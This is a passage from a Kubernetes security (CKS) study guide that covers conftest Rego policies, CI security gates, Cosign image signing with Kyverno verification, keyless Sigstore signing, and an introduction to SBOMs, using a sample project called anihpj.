25.4 conftest — Testing YAML with OPA Rego Policies

conftest tests structured configuration data (YAML, JSON, HCL, TOML, Dockerfiles) against policies written in OPA Rego — the same language used by OPA Gatekeeper (Ch24). Unlike kube-linter (fixed built-in checks) and kubesec (fixed scoring algorithm), conftest lets you define your own policies. This is the ultimate flexibility: enforce your organization's specific security standards, naming conventions, labeling requirements, and resource structure rules.

conftest vs OPA Gatekeeper — Same Language, Different Stage

Featureconftest (Ch25)OPA Gatekeeper (Ch24)
WhenPre-deployment (CI/CD, CLI, IDE)Deployment time (API server admission)
InputStatic YAML/JSON files on diskLive AdmissionReview API requests
LanguageRego (identical syntax)Rego (identical syntax)
Can test non-K8s✅ Dockerfiles, Terraform, HCL, TOML, JSON❌ Kubernetes only
BlockingBlocks CI/CD (non-zero exit code)Blocks API request (403 Forbidden)
Policy input pathinput.spec.template.spec.containers[_]input.review.object.spec.containers[_]

Fixture-Based Testing Pattern — Test Policies with Expected Results

conftest Fixture Testing — Policy + Test Fixtures + Expected Results
  ┌──────────────────────────────────────────────────────────────────────┐
  │                    FIXTURE-BASED TESTING                               │
  │                                                                       │
  │  Directory structure:                                                 │
  │  policies/                                                            │
  │  ├── security.rego          ← Policy rules to test                    │
  │  ├── security_test.rego     ← Test assertions                         │
  │  └── fixtures/                                                        │
  │      ├── good-pod.yaml      ← Should PASS all policies               │
  │      └── bad-pod.yaml       ← Should FAIL specific policies           │
  │                                                                       │
  │  ┌──────────────────────────────────────────────────────────────┐    │
  │  │  # policies/security_test.rego                                │    │
  │  │                                                                │    │
  │  │  package main                                                 │    │
  │  │                                                                │    │
  │  │  # Test: good-pod.yaml should have 0 deny results             │    │
  │  │  test_good_pod_has_no_violations {                            │    │
  │  │      count(deny) == 0 with input as yaml_unmarshal(           │    │
  │  │          file("fixtures/good-pod.yaml")                       │    │
  │  │      )                                                         │    │
  │  │  }                                                             │    │
  │  │                                                                │    │
  │  │  # Test: bad-pod.yaml should have at least 1 deny result      │    │
  │  │  test_bad_pod_has_violations {                                │    │
  │  │      count(deny) > 0 with input as yaml_unmarshal(            │    │
  │  │          file("fixtures/bad-pod.yaml")                        │    │
  │  │      )                                                         │    │
  │  │  }                                                             │    │
  │  │                                                                │    │
  │  │  # Run tests: conftest verify --policy policies/              │    │
  │  │  # Output: 2 tests passed, 0 tests failed                     │    │
  │  └──────────────────────────────────────────────────────────────┘    │
  └──────────────────────────────────────────────────────────────────────┘

Rego Policies for conftest — Security + Data + Warnings

Rego — policy/security.rego — Deny, warn, and data rules for anihpj 
package main

# ═══════════════════════════════════════════════════════════
# DENY RULES: Block the CI/CD pipeline (exit code 1)
# ═══════════════════════════════════════════════════════════

deny[msg] {
    container := input.spec.template.spec.containers[_]
    not container.securityContext
    msg := sprintf("container '%v' missing securityContext", [container.name])
}

deny[msg] {
    container := input.spec.template.spec.containers[_]
    container.securityContext.runAsUser == 0
    msg := sprintf("container '%v' running as root (UID 0)", [container.name])
}

deny[msg] {
    input.spec.template.spec.hostNetwork == true
    msg := "hostNetwork is not allowed"
}

# ═══════════════════════════════════════════════════════════
# WARN RULES: Show warnings but DON'T block (exit code 0)
# ═══════════════════════════════════════════════════════════

warn[msg] {
    container := input.spec.template.spec.containers[_]
    not container.resources.limits.cpu
    msg := sprintf("container '%v' missing CPU limit (recommended)", [container.name])
}

warn[msg] {
    container := input.spec.template.spec.containers[_]
    endswith(container.image, ":latest")
    msg := sprintf("container '%v' uses mutable ':latest' tag", [container.name])
}

# ═══════════════════════════════════════════════════════════
# DATA RULES: Extract information (always runs, informational)
# ═══════════════════════════════════════════════════════════

images[image] {
    container := input.spec.template.spec.containers[_]
    image := container.image
}

container_count := count(input.spec.template.spec.containers)

Running conftest — CLI, Multi-Parser, and Fixture Testing

Bash — conftest commands for all testing scenarios 
# ── Install ──
brew install conftest

# ── Test K8s manifests against Rego policies ──
conftest test anihpj-deployment.yaml
conftest test k8s/*.yaml

# ── Test with custom policy directory ──
conftest test --policy ./org-policies anihpj-deployment.yaml

# ── Test Dockerfile ──
conftest test --parser dockerfile Dockerfile

# ── Test Terraform ──
conftest test --parser hcl1 terraform/*.tf

# ── Test with JSON output (for CI/CD) ──
conftest test --output json anihpj-deployment.yaml

# ── Fixture-based testing (verify policies are correct) ──
conftest verify --policy policies/

# ── Combined pipeline ──
conftest test k8s/*.yaml && echo "✅ All passed" || echo "❌ Violations found"

25.5 Integrating Static Analysis into anihpj CI/CD — The Complete Security Gate

Each tool alone is useful. But together, they form a layered security gate that catches different classes of problems at different stages. The goal: no insecure manifest ever reaches the cluster. The pipeline starts at the developer's machine (pre-commit hooks), continues through PR review (CI checks), and culminates in image signing before deployment.

Developer Workflow — Pre-Commit Hooks for All Three Tools

YAML — .pre-commit-config.yaml — Run all three static analysis tools before git commit 
# .pre-commit-config.yaml
# Install: pip install pre-commit && pre-commit install
# Now EVERY git commit runs these checks. Blocked if any fail.
repos:
- repo: local
  hooks:
  # ── kube-linter: Built-in K8s checks ──
  - id: kube-linter
    name: kube-linter (K8s security checks)
    entry: kube-linter lint
    language: system
    files: ^k8s/.*\.(yaml|yml)$
    pass_filenames: false
    args: ['k8s/']

  # ── kubesec: Security score threshold ──
  - id: kubesec
    name: kubesec (security scoring)
    entry: bash -c
    language: system
    files: ^k8s/.*\.(yaml|yml)$
    args:
    - |
      for f in k8s/*.yaml; do
        SCORE=$(kubesec scan "$f" | jq -r '.[0].score')
        if [ "$SCORE" -lt 4 ]; then
          echo "❌ $f scored $SCORE (needs ≥4)" && exit 1
        fi
      done

  # ── conftest: Custom Rego policies ──
  - id: conftest
    name: conftest (custom Rego policies)
    entry: conftest test --policy policies/
    language: system
    files: ^k8s/.*\.(yaml|yml)$
    pass_filenames: false
    args: ['k8s/']

The Complete anihpj Security CI/CD Pipeline — 4 Gates

anihpj Security Pipeline — Developer Push → Production Deploy
  Developer pushes code → opens PR
         │
         ▼
  ╔══════════════════════════════════════════════════════════════════╗
  ║  GATE 1: YAML SECURITY (kube-linter + kubesec + conftest)       ║
  ║  ✅ No privileged containers | ✅ Score ≥4 | ✅ Rego policies    ║
  ║  ❌ FAIL → PR blocked with inline violation comments             ║
  ╚══════════════════════════════════════════════════════════════════╝
         │ ✅

  ║  GATE 2: DOCKERFILE SECURITY (hadolint)                         ║
  ║  ✅ Non-root USER | ✅ No ADD from URLs | ✅ COPY before RUN    ║
  ║  ❌ FAIL → PR blocked                                           ║
  ╚══════════════════════════════════════════════════════════════════╝
         │ ✅ PR merged
         ▼
  ╔══════════════════════════════════════════════════════════════════╗
  ║  GATE 3: IMAGE SCAN (trivy)                                     ║
  ║  ✅ CRITICAL CVEs = 0 | ✅ HIGH CVEs ≤ 2 (documented)          ║
  ║  ❌ FAIL → image NOT pushed                                     ║
  ╚══════════════════════════════════════════════════════════════════╝

💡 Key Takeaway for the CKS Exam

The CKS exam may ask you to scan a Kubernetes manifest with static analysis tools and fix the findings. Know: (1) kube-linter lint <file> — produces pass/fail results; add securityContext to fix privileged/run-as-non-root errors. (2) kubesec scan <file> — produces 0-10 score; know what adds points (runAsNonRoot, readOnlyRoot, seccomp, drop ALL caps) and what deducts (privileged: -5, SYS_ADMIN: -3). (3) conftest test <file> — tests against custom Rego policies; know the deny[msg] and warn[msg] patterns; understand the input path difference between conftest (input.spec.template.spec...) and OPA Gatekeeper (input.review.object.spec...). (4) The exam may ask you to fix a manifest to pass a specific score threshold — add runAsNonRoot, readOnlyRootFilesystem, drop ALL capabilities, use a non-root user, and set a custom ServiceAccount. (5) Shift left: these tools run BEFORE deployment. They complement admission controllers (Ch24), not replace them. Static analysis catches at code time ($0 cost), admission control enforces at deploy time.

Chapter 26: Image Signing — Cosign and Sigstore

You've built anihpj:v2. Trivy says zero CRITICAL CVEs. kubesec scores it 8/10. kube-linter gives it a clean bill. You push it to your private registry. But here's the terrifying question: how does your Kubernetes cluster KNOW that the image in the registry is actually YOUR image? An attacker who compromises your registry credentials could push a malicious image with the exact same tag — and your cluster would pull it without hesitation. This is where image signing comes in: cryptographic proof, verified at admission time, that the image was built by you and only you. Cosign (part of the CNCF-backed Sigstore project) signs container images with digital signatures stored alongside the image in the registry. Kyverno verifies those signatures before allowing pods to run. Together, they close the supply chain's final gap: proving that what you built is what you deploy.

🟡 Intermediate ⏱️ ~2 hours ✍️ Image Signing 📦 Supply Chain

  • ✅ Cosign key-based signing: Key generation with password protection, signing and verifying, key rotation strategies, multi-signer workflows
  • ✅ Kyverno verifyImages deep dive: Key rotation policy patterns, troubleshooting common failures, enforcement level decision framework
  • ✅ Keyless signing internals: Fulcio certificate chain of trust, Rekor transparency log querying, OIDC identity binding, and when to choose keyless over key-based

Supply Chain Security 20%

26.1 Why Image Signing Matters — Trust But Verify

You build anihpj:v2 in CI/CD, push it to registry.anihpj.com/anihpj:v2, and deploy. The cluster pulls the image and runs it. But how does the cluster know it's really your image? Registry credentials prove you can push — they don't prove what you pushed is what you built. Image signing solves this: you cryptographically sign the image digest with your private key. The cluster verifies the signature against your public key at admission time. If the signature doesn't match, the image is rejected — even if it came from the right registry with the right tag.

The Cryptography Behind Image Signing — ECDSA and Digest Immutability

How Digital Signatures Work — ECDSA Signing and Verification
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                    ECDSA DIGITAL SIGNATURE BASICS                          │
  │                                                                           │
  │  Cosign uses ECDSA-P256 (Elliptic Curve Digital Signature Algorithm)     │
  │  with the P-256 curve — same cryptography as TLS certificates.           │
  │                                                                           │
  │  SIGNING (in CI/CD):                                                      │
  │  ──────────────────                                                       │
  │  ┌──────────────────────────────────────────────────────────────────┐    │
  │  │  1. Image manifest is hashed: SHA256(manifest) → abc123def456   │    │
  │  │     (The hash is a fixed 256-bit fingerprint of the image)      │    │
  │  │                                                                   │    │
  │  │  2. Hash is signed with PRIVATE key:                             │    │
  │  │     Sign(private_key, abc123def456) → signature (r,s)           │    │
  │  │     (Only the private key holder can create this signature)      │    │
  │  │                                                                   │    │
  │  │  3. Signature + metadata is pushed to the registry as an         │    │
  │  │     OCI artifact: sha256-abc123.sig                              │    │
  │  └──────────────────────────────────────────────────────────────────┘    │
  │                                                                           │
  │  VERIFICATION (in Kyverno):                                               │
  │  ─────────────────────────                                                │
  │  ┌──────────────────────────────────────────────────────────────────┐    │
  │  │  1. Image manifest is hashed again: SHA256(manifest) → hash     │    │
  │  │                                                                   │    │
  │  │  2. Signature is retrieved from registry: sha256-abc123.sig     │    │
  │  │                                                                   │    │
  │  │  3. PUBLIC key verifies the signature against the hash:          │    │
  │  │     Verify(public_key, hash, signature) → TRUE/FALSE            │    │
  │  │                                                                   │    │
  │  │  4. If TRUE: The signature was created by the holder of the      │    │
  │  │     private key AND the image hasn't been modified since.        │    │
  │  └──────────────────────────────────────────────────────────────────┘    │
  │                                                                           │
  │  🔑 WHY DIGEST-BASED SIGNING IS ESSENTIAL:                                │
  │  ─────────────────────────────────────────                                │
  │  • Tags like "anihpj:v2" are MUTABLE — the same tag can point to         │
  │    different digests over time                                            │
  │  • Digests like "sha256:abc123..." are IMMUTABLE — they uniquely          │
  │    identify a specific image manifest                                     │
  │  • Cosign ALWAYS signs digests, never tags                                │
  │  • Even if an attacker overwrites the "v2" tag to point to their         │
  │    malicious image, the signature is bound to the DIGEST, not the tag     │
  └──────────────────────────────────────────────────────────────────────────┘

The Supply Chain Attack Vector — Without vs With Image Signing

Supply Chain Attack — Without vs With Image Signing
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                    WITHOUT IMAGE SIGNING                                   │
  │                                                                           │
  │  CI/CD                    REGISTRY                     KUBERNETES          │
  │  docker build         ┌──────────────┐              ┌──────────────┐     │
  │  anihpj:v2 ──────────▶│ anihpj:v2    │─────────────▶│ Pod runs     │     │
  │                        │ (legitimate) │              │ anihpj:v2 ✅ │     │
  │                        └──────────────┘              └──────────────┘     │
  │                                                                           │
  │  🔴 ATTACKER steals registry credentials:                                 │
  │  docker build         ┌──────────────┐              ┌──────────────┐     │
  │  anihpj:v2 ──────────▶│ anihpj:v2    │─────────────▶│ Pod runs     │     │
  │  (with backdoor)      │ (MALICIOUS!) │              │ BACKDOOR! 💀 │     │
  │                        └──────────────┘              └──────────────┘     │
  │                                                                           │
  │  ═══════════════════════════════════════════════════════════════════════  │
  │                    WITH IMAGE SIGNING (Cosign + Kyverno)                   │
  │                                                                           │
  │  CI/CD                    REGISTRY                     KUBERNETES          │
  │  docker build         ┌──────────────┐              ┌──────────────┐     │
  │  anihpj:v2 ──────────▶│ anihpj +.sig │              │ Kyverno      │     │
  │  cosign sign ────────▶│ + signature  │─────────────▶│ verifyImages │     │
  │                        └──────────────┘              │ ✅ Verified  │     │
  │                                                      └──────────────┘     │
  │                                                                           │
  │  🔴 ATTACKER TRIES (no private key to sign):                              │
  │  docker build         ┌──────────────┐              ┌──────────────┐     │
  │  backdoor:v2 ────────▶│ anihpj (NO   │─────────────▶│ Kyverno      │     │
  │                        │ .sig!)       │              │ ❌ NO SIG!   │     │
  │                        └──────────────┘              │ 403 DENIED  │     │
  │                                                      └──────────────┘     │
  │                                                                           │
  │  🔑 Even with stolen credentials, attacker CANNOT forge .sig without key │
  └──────────────────────────────────────────────────────────────────────────┘

How Image Signing Works — Cryptography in Plain English

1Generate Key Pair

cosign generate-key-pair creates an ECDSA-P256 private key (kept SECRET, used only in CI/CD) and a public key (shared with Kyverno for verification).

2Sign the Image Digest

cosign sign --key cosign.key registry.anihpj.com/anihpj:v2 resolves the tag to an immutable digest (sha256:abc...), hashes the manifest, signs with the private key, and stores the .sig OCI artifact.

3Verify at Admission

Kyverno fetches the .sig from registry, verifies it against the configured public key. If the signature is cryptographically valid → ALLOW. If missing or invalid → DENY.

4Transparency (Keyless)

With keyless signing, the signing event is also recorded in Rekor's public transparency log — providing an immutable, auditable record of who signed what and when.

The in-toto Attestation Framework — Beyond Signatures

Image signatures answer "who signed this image?" But in-toto attestations answer deeper questions: "How was this built? From what source? Using which builder? With what dependencies?" Cosign supports in-toto attestations, allowing you to attach SLSA provenance, vulnerability scan results, and SBOM references as signed metadata alongside the image signature:

in-toto Attestation Model — Predicates Signed by the Builder
  ┌──────────────────────────────────────────────────────────────────────┐
  │                    IN-TOTO ATTESTATION FRAMEWORK                       │
  │                                                                       │
  │  ┌──────────────────────────────────────────────────────────────┐    │
  │  │  ATTESTATION = Envelope {                                      │    │
  │  │    subject: [{                                                 │    │
  │  │      name: "registry.anihpj.com/anihpj",                      │    │
  │  │      digest: { sha256: "abc123..." }                          │    │
  │  │    }],                                                          │    │
  │  │    predicateType: "https://slsa.dev/provenance/v0.2",         │    │
  │  │    predicate: {                                                 │    │
  │  │      builder: { id: "https://github.com/anihsj/anihpj/..." },  │    │
  │  │      buildType: "https://github.com/actions/runner@v1",       │    │
  │  │      invocation: {                                              │    │
  │  │        configSource: { uri: "git+https://github.com/...",     │    │
  │  │          digest: { sha1: "def456..." },                        │    │
  │  │          entryPoint: ".github/workflows/build.yml" }           │    │
  │  │      },                                                         │    │
  │  │      materials: [{ uri: "git+https://github.com/anihsj/anihpj",│    │
  │  │        digest: { sha1: "def456..." } }]                         │    │
  │  │    }                                                            │    │
  │  │  }                                                              │    │
  │  └──────────────────────────────────────────────────────────────┘    │
  │                                                                       │
  │  🔑 ATTESTATIONS PROVE:                                               │
  │  • WHO built it (builder identity)                                    │
  │  • HOW it was built (build type, entry point)                        │
  │  • FROM WHAT source (git repo + commit SHA)                          │
  │  • WITH WHAT materials (dependencies, base images)                   │
  └──────────────────────────────────────────────────────────────────────┘

26.2 Cosign — Signing and Verifying Container Images

Cosign is the flagship signing tool of the Sigstore project (CNCF-backed, open-source). It signs container images by creating digital signatures and storing them directly in the OCI registry alongside the image — no separate signature server needed. Cosign supports both key-based signing (traditional public/private key pairs) and keyless signing (OIDC identity + Rekor transparency log). It works with any OCI-compliant registry: Docker Hub, AWS ECR, GCP Artifact Registry, Azure ACR, Harbor, and more.

Cosign Key-Based Workflow — Generate, Sign, Verify

Bash — Complete cosign key-based workflow with password protection 
# ═══════════════════════════════════════════════════════════════
# STEP 1: Generate a password-protected key pair
# ═══════════════════════════════════════════════════════════════
cosign generate-key-pair
# Prompts for a password — ALWAYS use one in production!
# Creates:
#   cosign.key   ← PRIVATE KEY (encrypted with password)
#   cosign.pub   ← PUBLIC KEY (give to Kyverno)

# To use the password in CI/CD non-interactively:
export COSIGN_PASSWORD="${{ secrets.COSIGN_KEY_PASSWORD }}"

# ═══════════════════════════════════════════════════════════════
# STEP 2: Sign the image
# ═══════════════════════════════════════════════════════════════
cosign sign --key cosign.key registry.anihpj.com/anihpj:v2.0.0
# What happens internally:
#   1. Resolves tag → digest (sha256:abc123...)
#   2. SHA256(manifest) → hash
#   3. ECDSA-Sign(private_key, hash) → signature
#   4. Pushes .sig as OCI artifact to registry

# ═══════════════════════════════════════════════════════════════
# STEP 3: Verify the signature
# ═══════════════════════════════════════════════════════════════
cosign verify --key cosign.pub registry.anihpj.com/anihpj:v2.0.0
# ✅ VALID: shows signature details + claims
# ❌ INVALID: "Error: no matching signatures found" (exit code 1)

Cosign Key Rotation Strategy — Signing with Old + New Keys During Transition

Bash — Key rotation: sign with both keys during transition period 
# ═══════════════════════════════════════════════════════════════
# KEY ROTATION STRATEGY (3-phase)
# ═══════════════════════════════════════════════════════════════

# PHASE 1: Generate new key pair (new key NOT yet trusted by Kyverno)
cosign generate-key-pair
# → cosign-v2.key, cosign-v2.pub

# PHASE 2: TRANSITION — Sign with BOTH old and new keys
cosign sign --key cosign-v1.key registry.anihpj.com/anihpj:v2.0.1
cosign sign --key cosign-v2.key registry.anihpj.com/anihpj:v2.0.1
# Image now has TWO valid signatures (old key + new key)

# PHASE 3: Update Kyverno to trust BOTH keys, then remove old key
# After all running pods use images signed with new key:
cosign sign --key cosign-v2.key registry.anihpj.com/anihpj:v2.0.2
# (No longer sign with old key)
# → Remove old public key from Kyverno ClusterPolicy
# → Securely delete cosign-v1.key

Cosign in CI/CD — GitHub Actions Integration

YAML — GitHub Actions: Build → Scan → Push → Sign anihpj image 
name: Build and Sign anihpj
on:
  push:
    branches: [main]
jobs:
  build-sign:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
    - uses: actions/checkout@v4
    - name: Build image
      run: docker build -t registry.anihpj.com/anihpj:${{ github.sha }} .
    - name: Trivy scan
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: registry.anihpj.com/anihpj:${{ github.sha }}
        exit-code: 1
        severity: CRITICAL,HIGH
    - name: Push to registry
      run: docker push registry.anihpj.com/anihpj:${{ github.sha }}
    - name: Install Cosign
      uses: sigstore/cosign-installer@v3
    - name: Sign image (key-based)
      run: |
        cosign sign --yes --key env://COSIGN_PRIVATE_KEY \
          registry.anihpj.com/anihpj:${{ github.sha }}
      env:
        COSIGN_PRIVATE_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
        COSIGN_PASSWORD: ${{ secrets.COSIGN_KEY_PASSWORD }}

Multi-Signer Workflows — Release Manager + CI/CD Co-Signing

Bash — Multiple signers: CI/CD key + release manager key 
# CI/CD pipeline signs the image with the CI key:
cosign sign --key ci-cosign.key registry.anihpj.com/anihpj:v2.0.0

# Release manager manually verifies and co-signs with release key:
cosign verify --key ci-cosign.pub registry.anihpj.com/anihpj:v2.0.0
cosign sign --key release-cosign.key registry.anihpj.com/anihpj:v2.0.0

# Image now has TWO signatures: CI key + release key
# Kyverno policy requires BOTH signatures (count: 2):
# attestors:
# - count: 2
#   entries:
#   - keys: { publicKeys: ci-cosign.pub }
#   - keys: { publicKeys: release-cosign.pub }

# Verify both signatures exist:
cosign verify --key ci-cosign.pub registry.anihpj.com/anihpj:v2.0.0
cosign verify --key release-cosign.pub registry.anihpj.com/anihpj:v2.0.0

How Cosign Stores Signatures — OCI Registry Internals

Cosign Signature Storage — OCI Registry Layout
  registry.anihpj.com/anihpj
  ├── 📦 Manifest (tag: v2.0.0) → sha256:abc123def456...
  ├── sha256:abc123def456.sig    ← Signature (ECDSA over manifest hash)
  ├── sha256:abc123def456.att    ← Attestation (in-toto SLSA provenance)
  └── sha256:abc123def456.sbom   ← SBOM (SPDX/CycloneDX)

  🔑 Signatures reference digests (immutable), never tags (mutable).
     Multiple signers = multiple .sig objects, all for the same digest.

26.3 Kyverno verifyImages — Enforcing Signed Images in Kubernetes

Signing images is only half the battle. The cluster must verify those signatures before running pods. Kyverno's verifyImages rule type does exactly this: at admission time, Kyverno retrieves the image's signature from the registry, verifies it against the configured public key(s), and either allows or denies the pod.

Kyverno verifyImages ClusterPolicy — Full Configuration with Key Rotation

YAML — Kyverno ClusterPolicy with key rotation support 
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-cosign-signature
spec:
  validationFailureAction: Enforce
  background: true
  rules:
  - name: check-cosign-signature
    match:
      any:
      - resources: { kinds: [Pod] }
    exclude:
      any:
      - resources: { namespaces: [kube-system, kyverno] }

    verifyImages:
    - imageReferences:
      - "registry.anihpj.com/*"

      # ── Require at least 1 valid signature ──
      attestors:
      - count: 1
        entries:
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
              -----END PUBLIC KEY-----
        # ── Key rotation: also accept OLD key during transition ──
        - keys:
            publicKeys: |-
              -----BEGIN PUBLIC KEY-----
              (previous key — remove after rotation complete)
              -----END PUBLIC KEY-----

Verification Flow — What Kyverno Does When a Pod Is Created

Kyverno verifyImages Flow
  kubectl apply → API Server → Kyverno Webhook
  │
  ├─ STEP 1: Resolve tag → digest (sha256:abc123...)
  ├─ STEP 2: GET registry/.../sha256-abc123.sig
  │   ├── 404 → ❌ DENY: "image is not signed"
  │   └── 200 → Continue
  ├─ STEP 3: cosign verify --key anihpj.pub
  │   ├── VALID ✅ → Pod allowed
  │   └── INVALID ❌ → 403: "signature validation failed"
  └─ STEP 4: (Optional) Check attestation predicates match policy

Troubleshooting Kyverno verifyImages Failures

Error MessageLikely CauseFix
image is not signed.sig artifact not found in registryRun cosign sign in CI/CD after docker push. Check registry permissions.
signature validation failedPublic key in Kyverno doesn't match private key used to signVerify cosign verify --key cosign.pub <image> locally. Check key mismatch.
no matching signaturesImage was signed with a different key or the signature expiredCheck which key signed the image: cosign verify --key <each-key>
certificate expiredKeyless certificate TTL (10 min) elapsed before verificationUse Rekor log for verification instead of time-limited certs.
registry auth failedKyverno can't pull .sig from private registryAdd imagePullSecrets or configure registry credentials in Kyverno.

🔴 ATTACK SCENARIO: Registry Credential Theft — Stopped by Kyverno

ATTACK SCENARIO How Signing Prevents Registry Credential Compromise from Becoming a Breach
1
Credential Theft

Attacker phishes DevOps engineer, obtains ECR push credentials for registry.anihpj.com.

2
Malicious Push

Attacker builds backdoored anihpj:v2.0.1, pushes to your private registry. Has valid credentials — push succeeds.

3
Deployment Attempt

New pod references registry.anihpj.com/anihpj:v2.0.1. Kubelet authenticates to ECR — pull succeeds.

🛡️
Kyverno BLOCKS

verifyImages rule fires: resolves digest → looks for .sig → NOT FOUND (attacker lacks private key). Returns DENY: "image is not signed." Pod NEVER created. Attack stopped at signature verification gate.

26.4 Keyless Signing with Sigstore — The Future of Image Signing

Traditional key-based signing has a fundamental problem: private key management. You must generate, store, rotate, and protect the private key. Keyless signing (Sigstore's Fulcio + Rekor) eliminates long-lived private keys. The signer proves identity using OIDC, Fulcio issues a short-lived certificate, and Rekor records the event in an immutable transparency log.

Keyless Signing Architecture — Fulcio + Rekor + OIDC

Keyless Signing — Ephemeral Keys + OIDC Identity + Transparency Log
  CI/CD (GitHub Actions)
  │
  ├─ 1. OIDC Token: "I am repo anihsj/anihpj on main branch"
  │     ↓
  ├─ 2. Fulcio CA: Verifies OIDC token → Issues 10-min X.509 cert
  │     Cert binds: identity → ephemeral public key
  │     ↓
  ├─ 3. Cosign signs image with ephemeral private key
  │     ↓
  ├─ 4. Certificate + signature → Rekor Transparency Log
  │     Immutable, public, auditable record
  │     ↓
  └─ 5. Signature (with Rekor reference) → OCI Registry

  🔑 KEYLESS = No long-lived secrets. Identity proven per-signature via OIDC.
     Compromise of CI/CD runner doesn't expose any persistent signing key.

Rekor Transparency Log — Querying and Auditing

Bash — Querying Rekor for signature transparency records 
# ── Search Rekor for entries related to an image ──
rekor-cli search --artifact registry.anihpj.com/anihpj:v2.0.0

# ── Get details of a specific Rekor entry ──
rekor-cli get --uuid <entry-uuid>

# ── Verify the Rekor inclusion proof ──
cosign verify --key cosign.pub \
  --rekor-url https://rekor.sigstore.dev \
  registry.anihpj.com/anihpj:v2.0.0

# ── Verify with identity + OIDC issuer (keyless) ──
cosign verify \
  --certificate-identity https://github.com/anihsj/anihpj/.github/workflows/build.yml@refs/heads/main \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  registry.anihpj.com/anihpj:v2.0.0

Key-Based vs Keyless — Decision Framework

FeatureKey-Based (cosign.key)Keyless (OIDC + Fulcio + Rekor)
Key management🔴 Generate, store, rotate, revoke🟢 No long-lived key to manage
Key compromise🔴 Catastrophic — attacker signs anything🟢 Minimal — no persistent key to steal
Identity binding"Whoever has the key"OIDC identity: repo + branch + workflow
Transparency❌ None by default✅ Rekor — immutable, public, auditable
Offline/air-gapped✅ Works offline🔴 Requires internet (Fulcio + Rekor)
CKS Exam✅ Primary — cosign sign --key⚠️ Know concept + --keyless flag
Best forAir-gapped, simple, CKS examProduction CI/CD, zero-trust, compliance

📊 Chapter 26 Visual Summary — Image Signing at a Glance

🔐
Why Sign (26.1)

Registry credentials ≠ trust. ECDSA signatures over immutable digests. in-toto attestations prove build provenance. Without signing, stolen credentials = instant compromise.

✍️
Cosign (26.2)

Sign with private key, verify with public. Password-protected keys. 3-phase key rotation. Multi-signer workflows for CI + release manager co-signing.

🛡️
Kyverno (26.3)

verifyImages at admission. Key rotation policy pattern. Troubleshooting guide for 5 common failures. Unsigned images → 403 Forbidden.

🔑
Keyless (26.4)

No long-lived keys. OIDC + Fulcio ephemeral cert + Rekor transparency log. Rekor querying for audit. Identity-based verification.

💡 Key Takeaway for the CKS Exam

The CKS exam expects you to understand image signing. Know: (1) cosign generate-key-pair creates the key pair, cosign sign --key cosign.key <image> signs, cosign verify --key cosign.pub <image> verifies. (2) Kyverno verifyImages enforces at admission — know the YAML structure with attestors.entries.keys.publicKeys. (3) Key rotation: sign with both old + new keys during transition, update Kyverno to accept both. (4) Keyless: cosign sign <image> (no --key), identity verification via --certificate-identity and --certificate-oidc-issuer. (5) Signatures reference immutable digests, never mutable tags. Even if an attacker overwrites a tag, the signature is bound to the original digest and will fail verification.

Chapter 27: Software Bill of Materials (SBOM) and SLSA

You scan your images with Trivy (Ch23), analyze your YAML with kube-linter (Ch25), and sign every image with Cosign (Ch26). But when Log4Shell (CVE-2021-44228, CVSS 10.0) was discovered in December 2021, organizations worldwide spent weeks manually auditing their software to answer one question: "Are we affected?" An SBOM (Software Bill of Materials) — a complete, machine-readable inventory of every component in your software — answers that question in seconds. And SLSA (Supply Chain Levels for Software Artifacts) provides a framework to verify that your build pipeline hasn't been tampered with. Together, SBOM and SLSA close the final supply chain gaps: knowing what's in your software and proving how it was built.

27.1 What Is an SBOM and Why Does It Matter?

An SBOM (Software Bill of Materials) is a complete, structured list of every component, library, and dependency in a software artifact — think of it as a nutrition label for software. For a container image like anihpj:v2, the SBOM lists every OS package (curl, libssl, glibc), every Python package (Django, gunicorn, psycopg2), and every transitive dependency — each with its exact version. When a critical CVE like Log4Shell drops, you query your SBOM database instead of manually auditing hundreds of images. SBOM → query → "anihpj:v2 does not use Log4j. Next." — in seconds, not weeks.

The Log4Shell Incident — Why SBOMs Became Mandatory

Log4Shell Response — Without SBOM vs With SBOM
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                    DECEMBER 10, 2021 — LOG4SHELL DROPS                    │
  │                                                                           │
  │  WITHOUT SBOM (what actually happened):                                   │
  │  ─────────────────────────────────────                                    │
  │  • CVE-2021-44228 published — CVSS 10.0, remote code execution           │
  │  • Security teams: "Are we affected?"                                     │
  │  • Manual audit begins: check every Java app, every container image      │
  │  • Weeks of work across hundreds of teams                                │
  │  • Many organizations didn't know they were affected for MONTHS          │
  │  • US government: "This cannot happen again"                              │
  │                                                                           │
  │  WITH SBOM (what should happen):                                          │
  │  ──────────────────────────────                                           │
  │  • CVE-2021-44228 published                                               │
  │  • Security team: grep SBOMs for "log4j"                                 │
  │  • Query returns: "anihpj:v2 — log4j NOT FOUND"                          │
  │  • Query returns: "legacy-app:v1 — log4j-core 2.14.1 — AFFECTED!"      │
  │  • Response time: SECONDS, not weeks                                     │
  │  • Targeted fix: update ONLY the affected images                         │
  │                                                                           │
  │  🔑 SBOMs turn vulnerability response from a MANUAL AUDIT into           │
  │     a DATABASE QUERY. This is why the US Executive Order 14028           │
  │     (May 2021) requires SBOMs for all federal software.                  │
  └──────────────────────────────────────────────────────────────────────────┘

SBOM Formats — SPDX vs CycloneDX

FeatureSPDXCycloneDX
Full nameSoftware Package Data ExchangeCycloneDX (OWASP project)
Standard bodyLinux Foundation (ISO/IEC 5962:2021)OWASP Foundation
FormatsJSON, YAML, RDF, tag-valueJSON, XML
FocusLicense compliance + securitySecurity + vulnerability management
K8s ecosystem✅ Syft default, Kubernetes SIG✅ Trivy, Dependency-Track
VEX support✅ Native VEX integration✅ VEX extension
CKS exam✅ Know it exists, syft -o spdx-json⚠️ Know it as an alternative format

VEX — Vulnerability Exploitability eXchange

